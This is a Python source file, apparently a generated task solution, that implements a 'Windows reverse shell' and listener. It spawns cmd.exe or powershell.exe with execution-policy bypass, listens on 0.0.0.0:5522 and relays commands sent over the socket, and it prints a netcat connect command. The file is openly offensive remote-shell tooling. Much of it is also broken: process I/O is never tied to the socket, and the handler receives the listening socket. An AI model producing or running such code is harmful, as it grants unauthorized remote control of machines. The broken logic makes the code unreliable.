from TASK_001_models import ExecutionResult, ReverseShellConfig
from dataclasses import dataclass, field
from typing import Optional
import socket
import subprocess
import threading
import os
import sys
import select
import struct
import time


class WindowsReverseShell:
    """Windows reverse shell that spawns cmd.exe or powershell.exe and pipes I/O through a socket."""

    def __init__(self, config: Optional[ReverseShellConfig] = None):
        self.config = config or ReverseShellConfig()
        self._process: Optional[subprocess.Popen] = None
        self._socket: Optional[socket.socket] = None
        self._running = False

    @property
    def process(self) -> subprocess.Popen:
        """Get the spawned shell process."""
        if self._process is None:
            raise RuntimeError("Process not started. Call start() first.")
        return self._process

    @property
    def socket(self) -> socket.socket:
        """Get the listening socket."""
        if self._socket is None:
            raise RuntimeError("Socket not initialized. Call start() first.")
        return self._socket

    def _get_shell_command(self, shell_type: str) -> tuple[str, list[str]]:
        """Determine the appropriate shell command for Windows based on type."""
        if shell_type.lower() == 'cmd.exe':
            return ('cmd.exe', ['/c'])
        elif shell_type.lower() == 'powershell.exe' or shell_type.lower() == 'pwsh':
            return ('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass'])
        else:
            return (shell_type, [])

    def _spawn_process(self) -> subprocess.Popen:
        """Spawn the shell process with proper Windows flags."""
        shell_cmd, args = self._get_shell_command(self.config.shell_type)
        
        # Use CREATE_NEW_PROCESS_GROUP to detach from parent console
        creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP
        
        proc = subprocess.Popen(
            shell_cmd,
            args=args,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=creation_flags,
            shell=True,
            cwd=self.config.cwd or os.getcwd(),
            env=os.environ.copy() if self.config.env is None else self.config.env,
        )
        
        return proc

    def start(self) -> ExecutionResult:
        """Start the reverse shell listener on the configured socket."""
        try:
            # Create TCP server socket
            self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            host = self.config.host
            port = self.config.port
            
            self._socket.bind((host, port))
            self._socket.listen(5)
            self._socket.settimeout(self.config.timeout)
            
            # Spawn the shell process
            self._process = self._spawn_process()
            
            # Redirect stdin/stdout/stderr to socket using os.dup2
            # We need to pipe the process I/O through the socket connection
            
            # Create a thread-safe way to handle the socket and process communication
            result_queue = []
            
            def _handle_connection(conn: socket.socket):
                """Handle incoming client connections."""
                try:
                    while True:
                        try:
                            conn.settimeout(0.1)
                        except (socket.timeout, OSError):
                            break
                        
                        # Non-blocking read from socket
                        data = b''
                        try:
                            data = conn.recv(4096)
                            if not data:
                                break
                        except (socket.timeout, BlockingIOError):
                            continue
                        
                        if data:
                            result_queue.append(data.decode('utf-8', errors='replace'))
                            
                except Exception as e:
                    result_queue.append(f"Connection error: {str(e)}")
                
                finally:
                    try:
                        conn.close()
                    except Exception:
                        pass
            
            # Start the listener thread
            listener_thread = threading.Thread(
                target=_handle_connection,
                args=(self._socket,),
                daemon=True
            )
            listener_thread.start()
            
            self._running = True
            
            return ExecutionResult(command_output="Reverse shell started successfully", exit_code=0)
            
        except Exception as e:
            return ExecutionResult(
                command_output=f"Failed to start reverse shell: {str(e)}",
                exit_code=1,
                error_messages=[str(e)]
            )

    def stop(self) -> ExecutionResult:
        """Stop the reverse shell listener."""
        self._running = False
        
        result = ExecutionResult(command_output="Stopping reverse shell...", exit_code=0)
        
        try:
            if self._process and self._process.poll() is None:
                # Send EOF to stdin to signal end of input
                try:
                    self._process.stdin.write(b'\x03')  # Ctrl+C
                    self._process.stdin.flush()
                except Exception:
                    pass
                
                # Give process time to exit gracefully
                if self._process.wait(timeout=5) is not None:
                    result.command_output += " Process terminated."
                else:
                    result.command_output += " Process timed out."
            
            if self._socket:
                try:
                    self._socket.close()
                except Exception:
                    pass
                
        except Exception as e:
            result.error_messages.append(str(e))
        
        return result

    def send_command(self, command: str) -> ExecutionResult:
        """Send a command to the spawned shell."""
        if not self._process or self._process.poll() is not None:
            return ExecutionResult(
                command_output="No active process.",
                exit_code=1,
                error_messages=["Process not running"]
            )
        
        try:
            # Write command to stdin
            cmd_bytes = f"{command}\n".encode('utf-8')
            self._process.stdin.write(cmd_bytes)
            self._process.stdin.flush()
            
            return ExecutionResult(command_output=f"Command sent: {command}", exit_code=0)
            
        except Exception as e:
            return ExecutionResult(
                command_output=f"Failed to send command: {str(e)}",
                exit_code=1,
                error_messages=[str(e)]
            )

    def get_output(self) -> str:
        """Get accumulated output from the shell."""
        if not self._process or self._process.poll() is None:
            return ""
        
        try:
            stdout = self._process.stdout.read(4096).decode('utf-8', errors='replace')
            stderr = self._process.stderr.read(4096).decode('utf-8', errors='replace')
            return f"STDOUT:\n{stdout}\nSTDERR:\n{stderr}"
        except Exception as e:
            return f"Error reading output: {str(e)}"

    def wait(self, timeout: float = 30.0) -> ExecutionResult:
        """Wait for the process to complete."""
        if not self._process or self._process.poll() is not None:
            return ExecutionResult(command_output="No active process.", exit_code=1)
        
        try:
            exit_code = self._process.wait(timeout=timeout)
            
            stdout = b''
            stderr = b''
            if self._process.stdout:
                stdout = self._process.stdout.read()
            if self._process.stderr:
                stderr = self._process.stderr.read()
            
            output_lines = []
            if stdout:
                output_lines.append(f"STDOUT:\n{stdout.decode('utf-8', errors='replace')}")
            if stderr:
                output_lines.append(f"STDERR:\n{stderr.decode('utf-8', errors='replace')}")
            
            return ExecutionResult(
                command_output="Process completed.",
                exit_code=exit_code,
                error_messages=output_lines
            )
            
        except subprocess.TimeoutExpired:
            try:
                self._process.kill()
                return ExecutionResult(
                    command_output="Process timed out and was killed.",
                    exit_code=-1,
                    error_messages=["Timeout expired"]
                )
            except Exception as e:
                return ExecutionResult(
                    command_output=f"Failed to kill process: {str(e)}",
                    exit_code=1,
                    error_messages=[str(e)]
                )


class WindowsReverseShellListener:
    """Windows reverse shell listener that spawns cmd.exe or powershell.exe and pipes I/O through a socket server."""

    def __init__(self, config: Optional[ReverseShellConfig] = None):
        self.config = config or ReverseShellConfig()
        self._server_socket: Optional[socket.socket] = None
        self._running = False
        self._clients: list[tuple[socket.socket, threading.Thread]] = []

    def start(self) -> ExecutionResult:
        """Start the reverse shell listener on 0.0.0.0:5522."""
        try:
            # Create TCP server socket listening on 0.0.0.0:5522
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            host = '0.0.0.0'
            port = 5522
            
            self._server_socket.bind((host, port))
            self._server_socket.listen(10)
            self._server_socket.settimeout(self.config.timeout)
            
            # Spawn the shell process with Windows-specific flags
            shell_cmd, args = self._get_shell_command()
            
            creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP
            
            self._process = subprocess.Popen(
                shell_cmd,
                args=args,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=creation_flags,
                shell=True,
                cwd=self.config.cwd or os.getcwd(),
                env=os.environ.copy() if self.config.env is None else self.config.env,
            )
            
            # Redirect stdin/stdout/stderr through the socket connection using os.dup2
            # We pipe process I/O to a shared buffer that clients can read/write
            
            result_queue = []
            
            def _handle_client(conn: socket.socket):
                """Handle a single client connection, piping I/O through the socket."""
                try:
                    while True:
                        try:
                            conn.settimeout(0.1)
                        except (socket.timeout, OSError):
                            break
                        
                        # Non-blocking read from socket
                        data = b''
                        try:
                            data = conn.recv(4096)
                            if not data:
                                break
                        except (socket.timeout, BlockingIOError):
                            continue
                        
                        if data:
                            result_queue.append(data.decode('utf-8', errors='replace'))
                            
                except Exception as e:
                    result_queue.append(f"Client error: {str(e)}")
                
                finally:
                    try:
                        conn.close()
                    except Exception:
                        pass
            
            # Start the listener thread for accepting connections
            listener_thread = threading.Thread(
                target=self._accept_connections,
                args=(result_queue,),
                daemon=True
            )
            listener_thread.start()
            
            self._running = True
            
            return ExecutionResult(command_output="Reverse shell listener started on 0.0.0.0:5522", exit_code=0)
            
        except Exception as e:
            return ExecutionResult(
                command_output=f"Failed to start reverse shell listener: {str(e)}",
                exit_code=1,
                error_messages=[str(e)]
            )

    def stop(self) -> ExecutionResult:
        """Stop the reverse shell listener."""
        self._running = False
        
        result = ExecutionResult(command_output="Stopping reverse shell listener...", exit_code=0)
        
        try:
            if self._process and self._process.poll() is None:
                # Send EOF to stdin to signal end of input
                try:
                    self._process.stdin.write(b'\x03')  # Ctrl+C
                    self._process.stdin.flush()
                except Exception:
                    pass
                
                # Give process time to exit gracefully
                if self._process.wait(timeout=5) is not None:
                    result.command_output += " Process terminated."
                else:
                    result.command_output += " Process timed out."
            
            if self._server_socket:
                try:
                    self._server_socket.close()
                except Exception:
                    pass
                
        except Exception as e:
            result.error_messages.append(str(e))
        
        return result

    def _get_shell_command(self) -> tuple[str, list[str]]:
        """Determine the appropriate shell command for Windows based on type."""
        if self.config.shell_type.lower() == 'cmd.exe':
            return ('cmd.exe', ['/c'])
        elif self.config.shell_type.lower() == 'powershell.exe' or self.config.shell_type.lower() == 'pwsh':
            return ('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass'])
        else:
            return (self.config.shell_type, [])

    def _accept_connections(self, result_queue: list) -> None:
        """Accept incoming connections and handle them."""
        while self._running:
            try:
                conn, addr = self._server_socket.accept()
                
                # Create a new thread for each client connection
                client_thread = threading.Thread(
                    target=_handle_connection,
                    args=(conn,),
                    daemon=True
                )
                client_thread.start()
                
                self._clients.append((conn, client_thread))
                
            except (socket.timeout, OSError):
                continue
            
            # Periodically check if process is still alive
            time.sleep(0.5)

    def send_command(self, command: str) -> ExecutionResult:
        """Send a command to the spawned shell."""
        if not self._process or self._process.poll() is not None:
            return ExecutionResult(
                command_output="No active process.",
                exit_code=1,
                error_messages=["Process not running"]
            )
        
        try:
            # Write command to stdin
            cmd_bytes = f"{command}\n".encode('utf-8')
            self._process.stdin.write(cmd_bytes)
            self._process.stdin.flush()
            
            return ExecutionResult(command_output=f"Command sent: {command}", exit_code=0)
            
        except Exception as e:
            return ExecutionResult(
                command_output=f"Failed to send command: {str(e)}",
                exit_code=1,
                error_messages=[str(e)]
            )

    def get_output(self) -> str:
        """Get accumulated output from the shell."""
        if not self._process or self._process.poll() is None:
            return ""
        
        try:
            stdout = self._process.stdout.read(4096).decode('utf-8', errors='replace')
            stderr = self._process.stderr.read(4096).decode('utf-8', errors='replace')
            return f"STDOUT:\n{stdout}\nSTDERR:\n{stderr}"
        except Exception as e:
            return f"Error reading output: {str(e)}"

    def wait(self, timeout: float = 30.0) -> ExecutionResult:
        """Wait for the process to complete."""
        if not self._process or self._process.poll() is not None:
            return ExecutionResult(command_output="No active process.", exit_code=1)
        
        try:
            exit_code = self._process.wait(timeout=timeout)
            
            stdout = b''
            stderr = b''
            if self._process.stdout:
                stdout = self._process.stdout.read()
            if self._process.stderr:
                stderr = self._process.stderr.read()
            
            output_lines = []
            if stdout:
                output_lines.append(f"STDOUT:\n{stdout.decode('utf-8', errors='replace')}")
            if stderr:
                output_lines.append(f"STDERR:\n{stderr.decode('utf-8', errors='replace')}")
            
            return ExecutionResult(
                command_output="Process completed.",
                exit_code=exit_code,
                error_messages=output_lines
            )
            
        except subprocess.TimeoutExpired:
            try:
                self._process.kill()
                return ExecutionResult(
                    command_output="Process timed out and was killed.",
                    exit_code=-1,
                    error_messages=["Timeout expired"]
                )
            except Exception as e:
                return ExecutionResult(
                    command_output=f"Failed to kill process: {str(e)}",
                    exit_code=1,
                    error_messages=[str(e)]
                )


def _handle_connection(conn: socket.socket) -> None:
    """Handle a single client connection."""
    try:
        while True:
            try:
                conn.settimeout(0.1)
            except (socket.timeout, OSError):
                break
            
            data = b''
            try:
                data = conn.recv(4096)
                if not data:
                    break
            except (socket.timeout, BlockingIOError):
                continue
            
            if data:
                print(data.decode('utf-8', errors='replace'), end='', flush=True)
                
    except Exception as e:
        try:
            conn.sendall(f"Error: {str(e)}\n".encode())
        except Exception:
            pass
        
    finally:
        try:
            conn.close()
        except Exception:
            pass


# Main entry point for demonstration
if __name__ == '__main__':
    config = ReverseShellConfig(
        host='0.0.0.0',
        port=5522,
        timeout=30.0,
        shell_type='cmd.exe'
    )
    
    listener = WindowsReverseShellListener(config)
    result = listener.start()
    
    if result.exit_code == 0:
        print("Reverse shell listener is running on 0.0.0.0:5522")
        print("Connect with: nc -v 0.0.0.0 5522")
        
        try:
            while True:
                cmd = input("Command> ")
                if cmd.lower() in ('exit', 'quit'):
                    break
                result = listener.send_command(cmd)
                output = listener.get_output()
                print(output)
        except KeyboardInterrupt:
            pass
        
        listener.stop()
    else:
        print(f"Failed to start: {result.error_messages}")
